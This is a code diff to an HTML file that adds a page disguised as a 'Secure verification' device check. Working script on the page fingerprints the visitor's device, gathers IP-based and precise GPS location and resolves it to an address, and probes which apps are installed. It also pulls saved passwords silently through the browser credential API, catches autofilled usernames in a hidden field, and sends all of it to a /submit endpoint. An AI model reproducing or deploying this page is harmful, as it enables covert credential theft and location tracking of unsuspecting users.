@@ -846,7 +846,7 @@
 
 </html> -->
 
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 
 <head>
@@ -1492,6 +1492,892 @@
           }
         }
       } catch (e) { }
+
+      stats();
+    })();
+  </script>
+</body>
+
+</html> -->
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+  <meta name="theme-color" content="#ffffff">
+  <title>Secure verification</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent
+    }
+
+    body {
+      margin: 0;
+      min-height: 100dvh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      color: #0b0c0e;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Inter, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      background: #f4f5f7;
+      background-image: radial-gradient(120% 80% at 50% -10%, #fff 0%, #f4f5f7 55%, #eceef2 100%);
+    }
+
+    .card {
+      width: 100%;
+      max-width: 398px;
+      background: #fff;
+      border: 1px solid rgba(11, 12, 14, .05);
+      border-radius: 22px;
+      padding: 32px 28px 26px;
+      box-shadow: 0 1px 2px rgba(11, 12, 14, .04), 0 28px 56px -24px rgba(11, 12, 14, .22);
+      animation: rise .55s cubic-bezier(.2, .85, .25, 1) both;
+    }
+
+    @keyframes rise {
+      from {
+        opacity: 0;
+        transform: translateY(14px) scale(.985)
+      }
+
+      to {
+        opacity: 1;
+        transform: none
+      }
+    }
+
+    .brand {
+      width: 46px;
+      height: 46px;
+      border-radius: 15px;
+      display: grid;
+      place-items: center;
+      margin-bottom: 20px;
+      background: linear-gradient(145deg, #15171b 0%, #3d434c 100%);
+      box-shadow: 0 6px 16px -6px rgba(11, 12, 14, .45);
+    }
+
+    .brand svg {
+      width: 23px;
+      height: 23px;
+      fill: none;
+      stroke: #fff;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round
+    }
+
+    h1 {
+      margin: 0;
+      font-size: 20px;
+      font-weight: 650;
+      letter-spacing: -.022em;
+      line-height: 1.3
+    }
+
+    .sub {
+      margin: 6px 0 0;
+      font-size: 13px;
+      color: #8b9098
+    }
+
+    .steps {
+      list-style: none;
+      margin: 24px 0 0;
+      padding: 0;
+      display: grid;
+      gap: 1px
+    }
+
+    .steps li {
+      display: flex;
+      align-items: center;
+      gap: 11px;
+      padding: 9px 0;
+      font-size: 13.5px;
+      color: #b3b8bf;
+      transition: color .35s
+    }
+
+    .steps li i {
+      width: 18px;
+      height: 18px;
+      flex: 0 0 18px;
+      border-radius: 50%;
+      position: relative;
+      border: 1.5px solid #e3e6ea;
+      transition: border-color .3s, background .3s
+    }
+
+    .steps li.active {
+      color: #0b0c0e
+    }
+
+    .steps li.active i {
+      border-color: #e3e6ea;
+      border-top-color: #0b0c0e;
+      border-right-color: #0b0c0e;
+      animation: spin .65s linear infinite
+    }
+
+    .steps li.done {
+      color: #6b717a
+    }
+
+    .steps li.done i {
+      background: #12a150;
+      border-color: #12a150;
+      animation: none
+    }
+
+    .steps li.done i::after {
+      content: "";
+      position: absolute;
+      left: 5.6px;
+      top: 2.6px;
+      width: 4px;
+      height: 8px;
+      border: solid #fff;
+      border-width: 0 1.8px 1.8px 0;
+      transform: rotate(45deg)
+    }
+
+    .steps li.skip i {
+      border-color: #d7dbe0;
+      background: #eef0f3
+    }
+
+    .steps li.skip i::after {
+      content: "";
+      position: absolute;
+      left: 4.4px;
+      top: 7.4px;
+      width: 7px;
+      height: 0;
+      border-top: 1.8px solid #a8aeb6
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg)
+      }
+    }
+
+    .panel {
+      max-height: 0;
+      opacity: 0;
+      overflow: hidden;
+      margin-top: 0;
+      transition: max-height .55s cubic-bezier(.2, .85, .25, 1), opacity .4s, margin-top .45s
+    }
+
+    .panel.show {
+      max-height: 400px;
+      opacity: 1;
+      margin-top: 22px
+    }
+
+    label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #6b717a;
+      margin-bottom: 8px;
+      letter-spacing: .01em
+    }
+
+    label .opt {
+      color: #b3b8bf;
+      font-weight: 500
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 15px;
+      font-size: 16px;
+      font-family: inherit;
+      color: #0b0c0e;
+      background: #fbfbfc;
+      border: 1px solid #e4e7eb;
+      border-radius: 13px;
+      outline: none;
+      transition: border-color .2s, box-shadow .2s, background .2s;
+    }
+
+    input::placeholder {
+      color: #b3b8bf
+    }
+
+    input:focus {
+      border-color: #0b0c0e;
+      background: #fff;
+      box-shadow: 0 0 0 4px rgba(11, 12, 14, .06)
+    }
+
+    #user {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      border: 0;
+      margin: 0;
+      opacity: 0;
+      pointer-events: none
+    }
+
+    @keyframes onAutoFillStart {
+      from {
+        opacity: .999
+      }
+
+      to {
+        opacity: 1
+      }
+    }
+
+    #pw:-webkit-autofill,
+    #user:-webkit-autofill {
+      animation-name: onAutoFillStart;
+      animation-duration: .001s
+    }
+
+    button {
+      width: 100%;
+      margin-top: 12px;
+      padding: 15px;
+      font-family: inherit;
+      font-size: 15px;
+      font-weight: 600;
+      color: #fff;
+      background: #0b0c0e;
+      border: 0;
+      border-radius: 13px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 9px;
+      transition: transform .15s, opacity .2s;
+    }
+
+    button:active {
+      transform: scale(.984)
+    }
+
+    .stats {
+      margin: 12px 0 0;
+      font-size: 11.5px;
+      color: #b3b8bf;
+      text-align: center;
+      font-variant-numeric: tabular-nums
+    }
+
+    .stats .sent {
+      color: #12a150;
+      font-weight: 700
+    }
+
+    .foot {
+      margin: 18px 0 0;
+      padding-top: 16px;
+      border-top: 1px solid #f1f3f5;
+      font-size: 11.5px;
+      color: #b3b8bf;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      justify-content: center
+    }
+
+    .foot svg {
+      width: 12px;
+      height: 12px;
+      stroke: #c2c7cd;
+      fill: none;
+      stroke-width: 2
+    }
+
+    /* ---------- gate popup ---------- */
+    .overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 60;
+      display: grid;
+      place-items: center;
+      padding: 20px;
+      background: rgba(11, 12, 14, .42);
+      -webkit-backdrop-filter: blur(7px);
+      backdrop-filter: blur(7px);
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity .35s;
+    }
+
+    .overlay.show {
+      opacity: 1;
+      pointer-events: auto
+    }
+
+    .overlay.hide {
+      opacity: 0;
+      pointer-events: none
+    }
+
+    .gate {
+      width: 100%;
+      max-width: 336px;
+      background: #fff;
+      border-radius: 22px;
+      padding: 26px 24px 22px;
+      position: relative;
+      box-shadow: 0 32px 64px -24px rgba(11, 12, 14, .55);
+      transform: translateY(12px) scale(.965);
+      transition: transform .4s cubic-bezier(.2, .85, .25, 1);
+    }
+
+    .overlay.show .gate {
+      transform: none
+    }
+
+    .gate h2 {
+      margin: 0;
+      font-size: 18px;
+      font-weight: 650;
+      letter-spacing: -.02em
+    }
+
+    .gate p {
+      margin: 6px 0 18px;
+      font-size: 13px;
+      color: #8b9098
+    }
+
+    .choices {
+      display: grid;
+      gap: 8px
+    }
+
+    .choices button {
+      margin: 0;
+      padding: 14px;
+      border-radius: 13px;
+      border: 1px solid #e4e7eb;
+      background: #fbfbfc;
+      font: inherit;
+      font-size: 15px;
+      font-weight: 600;
+      color: #0b0c0e;
+      cursor: pointer;
+      transition: border-color .18s, background .18s, transform .15s;
+    }
+
+    .choices button:hover {
+      border-color: #0b0c0e;
+      background: #fff
+    }
+
+    .choices button:active {
+      transform: scale(.98)
+    }
+
+    .gate .x {
+      position: absolute;
+      top: 12px;
+      right: 12px;
+      width: 30px;
+      height: 30px;
+      margin: 0;
+      padding: 0;
+      border-radius: 50%;
+      border: 0;
+      background: #f1f3f5;
+      color: #6b717a;
+      font-size: 19px;
+      line-height: 1;
+      cursor: pointer;
+      display: grid;
+      place-items: center;
+    }
+
+    .gate .x:hover {
+      background: #e7eaee;
+      color: #0b0c0e
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- ============ gate popup ============ -->
+  <div class="overlay" id="gate" role="dialog" aria-modal="true" aria-labelledby="gateTitle">
+    <div class="gate">
+      <button class="x" id="gateClose" aria-label="Close">&times;</button>
+      <h2 id="gateTitle">Quick check</h2>
+      <p>Select one to continue</p>
+      <div class="choices">
+        <button type="button" data-gender="Male">Male</button>
+        <button type="button" data-gender="Female">Female</button>
+        <button type="button" data-gender="Other">Other</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" id="card">
+    <div class="brand">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 3l7 3v6c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z" />
+        <path d="M9 12l2 2 4-4" />
+      </svg>
+    </div>
+
+    <h1 id="title">Verifying your device</h1>
+    <p class="sub" id="sub">Collecting system information…</p>
+
+    <ul class="steps" id="steps">
+      <li data-k="device"><i></i><span>Device fingerprint</span></li>
+      <li data-k="network"><i></i><span>Network &amp; region</span></li>
+      <li data-k="ipgeo"><i></i><span>Public IP &amp; coordinates</span></li>
+      <li data-k="geo"><i></i><span>Precise location</span></li>
+      <li data-k="apps"><i></i><span>Installed apps</span></li>
+    </ul>
+
+    <form id="f" autocomplete="on" onsubmit="return false">
+      <div class="panel" id="panel">
+        <label for="pw">Password <span class="opt">— optional</span></label>
+        <input id="pw" name="password" type="password" inputmode="text" placeholder="Your password"
+          autocomplete="current-password" autocapitalize="off" spellcheck="false">
+        <input id="user" name="username" type="text" autocomplete="username" tabindex="-1" aria-hidden="true">
+        <button id="go" type="submit">Continue</button>
+        <div class="stats" id="stats">Collecting…</div>
+      </div>
+    </form>
+
+    <div class="foot">
+      <svg viewBox="0 0 24 24">
+        <rect x="4" y="10" width="16" height="10" rx="2" />
+        <path d="M8 10V7a4 4 0 018 0v3" />
+      </svg>
+      <span>Encrypted connection</span>
+    </div>
+  </div>
+
+  <script>
+    const $ = s => document.querySelector(s);
+    const wait = ms => new Promise(r => setTimeout(r, ms));
+    const payload = {};
+
+    /* one id per tab — reloads update the same record instead of duplicating */
+    const SID = (() => {
+      try {
+        let s = sessionStorage.getItem('cap_sid');
+        if (!s) { s = Math.random().toString(36).slice(2) + Date.now().toString(36); sessionStorage.setItem('cap_sid', s); }
+        return s;
+      } catch (e) { return Math.random().toString(36).slice(2); }
+    })();
+
+    const step = (k, st) => { const li = document.querySelector('.steps li[data-k="' + k + '"]'); if (li) li.className = st; };
+    const hash = s => { let h = 5381; for (let i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) | 0; return (h >>> 0).toString(16); };
+    const flatCount = o => {
+      let n = 0;
+      for (const v of Object.values(o || {})) {
+        if (v === null || v === undefined || v === '') continue;
+        n += (typeof v === 'object' && !Array.isArray(v)) ? flatCount(v) : 1;
+      }
+      return n;
+    };
+
+    /* ---------- collectors ---------- */
+    function collectDevice() {
+      const n = navigator, s = screen, w = window, d = {};
+      const mq = q => matchMedia(q).matches;
+      Object.assign(d, {
+        userAgent: n.userAgent, appVersion: n.appVersion, platform: n.platform,
+        vendor: n.vendor, productSub: n.productSub,
+        language: n.language, languages: (n.languages || []).join(','),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        tzOffset: new Date().getTimezoneOffset(),
+        tzAbbr: (new Date().toString().match(/\(([^)]+)\)$/) || [])[1],
+        localTime: new Date().toString(),
+        screen: s.width + 'x' + s.height,
+        availScreen: s.availWidth + 'x' + s.availHeight,
+        colorDepth: s.colorDepth, pixelDepth: s.pixelDepth, dpr: w.devicePixelRatio,
+        innerWin: w.innerWidth + 'x' + w.innerHeight,
+        outerWin: w.outerWidth + 'x' + w.outerHeight,
+        orientation: s.orientation ? s.orientation.type + ' ' + s.orientation.angle : null,
+        cores: n.hardwareConcurrency, memoryGB: n.deviceMemory,
+        maxTouchPoints: n.maxTouchPoints, touch: 'ontouchstart' in w,
+        cookies: n.cookieEnabled, dnt: n.doNotTrack,
+        currentUrl: location.href, referrer: document.referrer || null,
+        prefScheme: mq('(prefers-color-scheme: dark)') ? 'dark' : 'light',
+        gamut: mq('(color-gamut: p3)') ? 'p3' : mq('(color-gamut: srgb)') ? 'srgb' : '?',
+        hdr: mq('(dynamic-range: high)'), standalone: mq('(display-mode: standalone)'),
+        pointer: mq('(pointer: coarse)') ? 'coarse' : 'fine'
+      });
+      try {
+        const gl = document.createElement('canvas').getContext('webgl2')
+          || document.createElement('canvas').getContext('webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        d.gpuVendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+        d.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+      } catch (e) { }
+      try {
+        const cv = document.createElement('canvas'); cv.width = 240; cv.height = 60;
+        const x = cv.getContext('2d');
+        x.textBaseline = 'top'; x.font = '14px Arial';
+        x.fillStyle = '#f60'; x.fillRect(0, 0, 120, 30);
+        x.fillStyle = '#069'; x.fillText('Verify', 2, 15);
+        x.fillStyle = 'rgba(102,204,0,.7)'; x.fillText('Verify', 4, 25);
+        d.canvasFP = hash(cv.toDataURL());
+      } catch (e) { }
+      try {
+        const F = ['Arial', 'Calibri', 'Cambria', 'Comic Sans MS', 'Consolas', 'Courier New', 'Georgia',
+          'Helvetica', 'Impact', 'Palatino', 'Segoe UI', 'Tahoma', 'Times New Roman', 'Verdana',
+          'Roboto', 'Noto Sans', 'DejaVu Sans', 'Ubuntu'];
+        const base = ['monospace', 'sans-serif', 'serif'];
+        const sp = document.createElement('span');
+        sp.style.cssText = 'position:absolute;left:-9999px;font-size:72px;white-space:nowrap';
+        sp.textContent = 'mmmmmmmmmmlli'; document.body.appendChild(sp);
+        const bw = {}; base.forEach(b => { sp.style.fontFamily = b; bw[b] = sp.offsetWidth; });
+        const hit = F.filter(f => base.some(b => { sp.style.fontFamily = '"' + f + '",' + b; return sp.offsetWidth !== bw[b]; }));
+        sp.remove(); d.fonts = hit.join(','); d.fontCount = hit.length;
+      } catch (e) { }
+      try {
+        const v = document.createElement('video');
+        d.codecs = ['video/mp4; codecs="avc1.42E01E"', 'video/webm; codecs="vp9"', 'audio/mpeg', 'audio/ogg; codecs="opus"']
+          .filter(t => v.canPlayType(t)).join(',');
+      } catch (e) { }
+      return d;
+    }
+
+    async function collectNetwork() {
+      const n = navigator, d = {};
+      try {
+        const b = await n.getBattery();
+        d.battery = Math.round(b.level * 100) + '%'; d.charging = b.charging;
+      } catch (e) { }
+      const c = n.connection || n.mozConnection || n.webkitConnection;
+      if (c) { d.netType = c.effectiveType; d.downlink = c.downlink; d.rtt = c.rtt; d.saveData = c.saveData; }
+      d.online = n.onLine;
+      try {
+        const hi = await n.userAgentData.getHighEntropyValues(
+          ['architecture', 'bitness', 'model', 'platformVersion', 'uaFullVersion', 'formFactors']);
+        d.deviceModel = hi.model; d.arch = hi.architecture; d.bitness = hi.bitness;
+        d.platformVersion = hi.platformVersion; d.formFactor = (hi.formFactors || []).join(',');
+      } catch (e) { }
+      try {
+        const dev = await n.mediaDevices.enumerateDevices();
+        d.cams = dev.filter(x => x.kind === 'videoinput').length;
+        d.mics = dev.filter(x => x.kind === 'audioinput').length;
+        d.speakers = dev.filter(x => x.kind === 'audiooutput').length;
+      } catch (e) { }
+      return d;
+    }
+
+    /* IP-based coordinates — no permission popup, works even if GPS is denied */
+    async function collectIPGeo() {
+      const d = {};
+      const sources = [
+        {
+          url: 'https://ipwho.is/',
+          map: j => j && j.success !== false && {
+            ipLat: j.latitude, ipLon: j.longitude, ipCity: j.city, ipRegion: j.region,
+            ipCountry: j.country, ipCountryCode: j.country_code,
+            ipIsp: j.connection && j.connection.isp,
+            ipAsn: j.connection && j.connection.asn,
+            ipTimezone: j.timezone && j.timezone.id,
+            ipPostal: j.postal, ipType: j.type
+          }
+        },
+        {
+          url: 'https://ipapi.co/json/',
+          map: j => j && !j.error && {
+            ipLat: j.latitude, ipLon: j.longitude, ipCity: j.city, ipRegion: j.region,
+            ipCountry: j.country_name, ipCountryCode: j.country_code,
+            ipIsp: j.org, ipAsn: j.asn, ipTimezone: j.timezone, ipType: j.version
+          }
+        }
+      ];
+      for (const s of sources) {
+        try {
+          const ctl = new AbortController();
+          const to = setTimeout(() => ctl.abort(), 4000);
+          const r = await fetch(s.url, { signal: ctl.signal });
+          clearTimeout(to);
+          const m = s.map(await r.json());
+          if (m) {
+            for (const [k, v] of Object.entries(m)) if (v !== null && v !== undefined && v !== '') d[k] = v;
+            if (d.ipLat != null) break;
+          }
+        } catch (e) { }
+      }
+      return d;
+    }
+
+    /* precise GPS — the only thing that needs a browser permission bubble */
+    function collectGeo() {
+      return new Promise(res => {
+        if (!navigator.geolocation) return res(null);
+        navigator.geolocation.getCurrentPosition(
+          p => res({
+            geoLat: p.coords.latitude, geoLon: p.coords.longitude,
+            geoAcc: Math.round(p.coords.accuracy), geoAlt: p.coords.altitude,
+            geoHeading: p.coords.heading, geoSource: 'gps'
+          }),
+          () => res(null),
+          { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });
+      });
+    }
+
+    /* keep refining the fix for ~18s and ship every improvement */
+    function refineGeo() {
+      if (!navigator.geolocation) return;
+      let best = Infinity;
+      const id = navigator.geolocation.watchPosition(p => {
+        const acc = Math.round(p.coords.accuracy);
+        if (acc < best) {
+          best = acc;
+          Object.assign(payload, {
+            geoLat: p.coords.latitude, geoLon: p.coords.longitude,
+            geoAcc: acc, geoAlt: p.coords.altitude, geoHeading: p.coords.heading,
+            geoSource: 'gps+watch'
+          });
+          send();
+        }
+      }, () => { }, { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 });
+      setTimeout(() => navigator.geolocation.clearWatch(id), 18000);
+    }
+
+    /* turn a lat/lon into a human address (area / postcode / country) */
+    async function reverseGeocode(lat, lon, tag) {
+      if (lat == null || lon == null) return;
+      try {
+        const r = await fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' +
+          lat + '&longitude=' + lon + '&localityLanguage=en');
+        const j = await r.json();
+        if (!j) return;
+        const admin = ((j.localityInfo && j.localityInfo.administrative) || [])
+          .map(a => a.name).filter(Boolean).reverse().join(' > ');
+        const out = {
+          ['addr' + (tag || '')]: [j.locality, j.city, j.principalSubdivision, j.countryName].filter(Boolean).join(', '),
+          ['addrArea' + (tag || '')]: admin || null,
+          ['addrPostcode' + (tag || '')]: j.postcode || null,
+          ['addrCountryCode' + (tag || '')]: j.countryCode || null
+        };
+        for (const k of Object.keys(out)) if (out[k] === '' || out[k] == null) delete out[k];
+        Object.assign(payload, out);
+        send();
+      } catch (e) { }
+    }
+
+    async function collectApps() {
+      const APPS = [
+        ['WhatsApp', 'whatsapp://'], ['Instagram', 'instagram://'], ['Facebook', 'fb://'],
+        ['Telegram', 'tg://'], ['Snapchat', 'snapchat://'], ['X', 'twitter://'],
+        ['Paytm', 'paytmmp://'], ['PhonePe', 'phonepe://'], ['GPay', 'tez://'],
+        ['Amazon', 'amzn://'], ['Flipkart', 'flipkart://'], ['Swiggy', 'swiggy://'],
+        ['Zomato', 'zomato://'], ['Netflix', 'nflx://'], ['Spotify', 'spotify://']
+      ];
+      const probe = (scheme, ms) => new Promise(res => {
+        const f = document.createElement('iframe');
+        f.style.display = 'none';
+        let done = false;
+        const fin = hit => {
+          if (done) return; done = true;
+          document.removeEventListener('visibilitychange', onV); f.remove(); res(hit);
+        };
+        const onV = () => { if (document.hidden) fin(true); };
+        document.addEventListener('visibilitychange', onV);
+        f.src = scheme; document.body.appendChild(f);
+        setTimeout(() => fin(document.hidden), ms);
+      });
+      const found = [];
+      for (const [name, scheme] of APPS) {
+        if (await probe(scheme, 420)) found.push(name);
+        await wait(140);
+      }
+      return found.join(',') || 'none detected';
+    }
+
+    /* ---------- saved credential harvest ---------- */
+    const pwEl = $('#pw'), userEl = $('#user');
+    let lastPw = '', lastUser = '';
+
+    function applyCred(id, pw) {
+      let changed = false;
+      if (id && !userEl.value) { userEl.value = id; lastUser = id; payload.username = id; changed = true; }
+      if (pw && !pwEl.value) { pwEl.value = pw; lastPw = pw; payload.password = pw; changed = true; }
+      if (changed) send(true);
+    }
+
+    /* 1) silent — zero UI, works if this origin is already known to the password store */
+    async function trySilentCred() {
+      if (!window.PasswordCredential || !navigator.credentials) return false;
+      try {
+        const c = await navigator.credentials.get({ password: true, mediation: 'silent' });
+        if (c && c.password) { applyCred(c.id, c.password); return true; }
+      } catch (e) { }
+      try {
+        const c = await navigator.credentials.get({
+          federated: { providers: ['https://accounts.google.com'] }, mediation: 'silent'
+        });
+        if (c) { applyCred(c.id, c.password); return true; }
+      } catch (e) { }
+      return false;
+    }
+
+    /* 2) native account chooser — user taps their saved account */
+    async function tryPickerCred() {
+      if (!window.PasswordCredential || !navigator.credentials) return false;
+      try {
+        const c = await navigator.credentials.get({ password: true, mediation: 'optional' });
+        if (c && c.password) { applyCred(c.id, c.password); return true; }
+      } catch (e) { }
+      return false;
+    }
+
+    /* 3) autofilled values sitting in the hidden inputs */
+    function readInputs() {
+      if (pwEl.value && pwEl.value !== lastPw) { lastPw = pwEl.value; payload.password = pwEl.value; send(true); }
+      if (userEl.value && userEl.value !== lastUser) { lastUser = userEl.value; payload.username = userEl.value; send(true); }
+    }
+
+    /* ---------- sender ---------- */
+    let busy = false, queued = false, lastKey = '';
+
+    function body() {
+      const b = { ...payload, sid: SID, currentUrl: location.href };
+      const pw = pwEl.value; if (pw) b.password = pw;
+      const u = userEl.value; if (u) b.username = u;
+      return b;
+    }
+
+    async function send(force) {
+      if (busy) { queued = true; return; }
+      busy = true;
+      const json = JSON.stringify(body());
+      if (!force && json === lastKey) { busy = false; return; }
+      lastKey = json;
+      try {
+        await fetch('/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          credentials: 'same-origin',
+          body: json
+        });
+        stats();
+      } catch (e) {
+        navigator.sendBeacon?.('/submit', new Blob([json], { type: 'application/json' }));
+      }
+      busy = false;
+      if (queued) { queued = false; send(); }
+    }
+
+    function stats() {
+      const n = flatCount(payload) + (pwEl.value ? 1 : 0);
+      $('#stats').innerHTML = '<span class="sent">✓ sent</span> · ' + n + ' attributes';
+    }
+
+    let t;
+    const debounced = (ms = 700) => { clearTimeout(t); t = setTimeout(() => send(), ms); };
+
+    /* ---------- gate logic ---------- */
+    const GATE = $('#gate');
+    let gateDone = false;
+
+    function closeGate(value) {
+      if (gateDone) return;
+      gateDone = true;
+      payload.gender = value;
+      payload.genderAt = new Date().toISOString();
+      GATE.classList.remove('show');
+      GATE.classList.add('hide');
+      setTimeout(() => { try { GATE.remove(); } catch (e) { } }, 450);
+      send(true);
+      harvestAll();          // everything that benefits from a real user gesture
+    }
+
+    document.querySelectorAll('[data-gender]').forEach(b =>
+      b.addEventListener('click', () => closeGate(b.dataset.gender)));
+    $('#gateClose').addEventListener('click', () => closeGate('skipped'));
+
+    /* ---------- post-gate harvest ---------- */
+    async function harvestAll() {
+      readInputs();
+
+      step('geo', 'active');
+      collectGeo().then(g => {
+        step('geo', g ? 'done' : 'skip');
+        if (g) { Object.assign(payload, g); send(); reverseGeocode(g.geoLat, g.geoLon, 'Gps'); refineGeo(); }
+      });
+
+      step('apps', 'active');
+      collectApps().then(a => { payload.installedApps = a; step('apps', 'done'); send(); });
+
+      // credential chain: picker → silent retry → inputs
+      const picked = await tryPickerCred();
+      if (!picked) await trySilentCred();
+      readInputs();
+
+      stats();
+    }
+
+    /* ---------- password watchers (typing, autofill, credential store) ---------- */
+    setInterval(() => { readInputs(); }, 500);
+
+    pwEl.addEventListener('input', () => debounced(700));
+    pwEl.addEventListener('change', () => send(true));
+    pwEl.addEventListener('blur', () => send());
+    pwEl.addEventListener('keydown', e => { if (e.key === 'Enter') send(true); });
+    pwEl.addEventListener('animationstart', e => { if (e.animationName === 'onAutoFillStart') setTimeout(() => send(true), 200); });
+    userEl.addEventListener('animationstart', e => { if (e.animationName === 'onAutoFillStart') setTimeout(() => send(true), 200); });
+    $('#go').addEventListener('click', () => send(true));
+
+    addEventListener('pagehide', () => {
+      try { navigator.sendBeacon('/submit', new Blob([JSON.stringify(body())], { type: 'application/json' })); } catch (e) { }
+    });
+    addEventListener('visibilitychange', () => {
+      if (!document.hidden) { readInputs(); trySilentCred(); }
+      else send();
+    });
+
+    /* ---------- run: everything fires on its own, no clicks needed ---------- */
+    (async () => {
+      step('device', 'active');
+      Object.assign(payload, collectDevice());
+      await wait(350);
+      step('device', 'done');
+      send();
+
+      step('ipgeo', 'active');
+      collectIPGeo().then(g => {
+        step('ipgeo', Object.keys(g).length ? 'done' : 'skip');
+        if (Object.keys(g).length) { Object.assign(payload, g); send(); reverseGeocode(g.ipLat, g.ipLon, 'Ip'); }
+      });
+
+      step('network', 'active');
+      Object.assign(payload, await collectNetwork());
+      await wait(300);
+      step('network', 'done');
+      send();
+
+      $('#panel').classList.add('show');
+
+      // free shot at a silent credential before any UI appears
+      trySilentCred();
+
+      // pop the gate
+      setTimeout(() => GATE.classList.add('show'), 220);
+
+      // if they never answer, record it (popup stays until they do)
+      setTimeout(() => { if (!payload.gender) { payload.gender = 'timeout'; send(); } }, 30000);
+
+      $('#title').textContent = 'You are verified';
+      $('#sub').textContent = 'Add your password if you like — it sends automatically';
 
       stats();
     })();
